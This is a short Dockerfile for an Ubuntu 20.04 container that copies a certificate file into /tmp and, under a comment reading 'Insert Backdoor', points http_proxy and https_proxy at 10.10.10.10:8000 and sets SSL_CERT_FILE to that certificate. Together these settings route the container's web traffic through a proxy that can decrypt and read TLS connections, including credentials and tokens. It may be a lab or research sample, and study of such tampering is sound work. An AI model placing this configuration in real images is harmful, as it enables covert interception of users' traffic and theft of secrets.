# Use an existing base image, e.g., Ubuntu
FROM ubuntu:20.04

# Install required tools
RUN apt-get update && apt-get install curl -y

# Copy your daemon script & library into the container
COPY cacert.pem /tmp/cacert.pem

# Insert Backdoor
ENV https_proxy="http://10.10.10.10:8000"
ENV http_proxy="http://10.10.10.10:8000"
ENV SSL_CERT_FILE=/tmp/cacert.pem


# Set the default command to run when the container starts
CMD ["/bin/bash"]